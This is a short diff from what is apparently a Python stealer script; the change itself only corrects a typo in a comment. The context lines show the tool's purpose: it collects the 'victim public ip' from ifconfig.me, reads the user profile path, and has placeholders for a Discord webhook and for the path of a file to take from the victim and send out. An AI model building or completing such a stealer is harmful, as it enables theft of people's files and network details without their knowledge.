@@ -9,7 +9,7 @@ userprofile = os.environ["USERPROFILE"] #path file > C:\Users\{username} (you ca
 i = requests.get("https://ifconfig.me") #get victim public ip
 weburl = 'ENTER HERE YOUR WEBHOOK' #enter here your discord webhook url
 file = 'ENTER HERE YOUR FILE PATH' #enter here the file path of file that you want take
-name = 'ENTER HERE THE NAME YOU WANT THE FILE SENT TO DISCORD TO HAVE' #enter here the name of teh sent file
+name = 'ENTER HERE THE NAME YOU WANT THE FILE SENT TO DISCORD TO HAVE' #enter here the name of the sent file
 message = 'INSERT HERE THE MESSAGE THAT WILL BE SENT IN DISCORD' #enter here the message embed
 
 #create function
